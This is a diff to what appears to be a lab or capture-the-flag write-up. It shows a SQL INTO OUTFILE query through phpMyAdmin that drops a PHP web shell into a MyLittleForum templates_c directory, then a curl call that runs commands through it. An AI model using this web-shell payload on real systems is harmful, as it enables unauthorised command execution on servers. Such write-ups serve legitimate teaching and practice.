@@ -30,7 +30,8 @@ well now we can connect to the phpmyadmin instance, it's very useful as we can u
 
 trying to write a simple command launcher into the http server directory `SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/backdoor.php"` fails. we need to find a location where we have write access.
 
-maybe with the forum ? looking at the forum source code (mylittleforum) there is multiples directory, trying multiples we find `templates_c` where we can write the file. since `templates_c` contains user modified templates for the website, the user modified the permissions to modify it.
+maybe with the forum ? looking at the forum source code (mylittleforum) there is multiples directory, and `templates_c` which contains user modified templates for the website, the user might have modified the permissions to modify it.
+`SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/backdoor.php"` and it works.
 
 so now we just have to access it: `curl --insecure https://vm/forum/templates_c/backdoor.php?cmd=whoami` and we are www-data as expected.
 
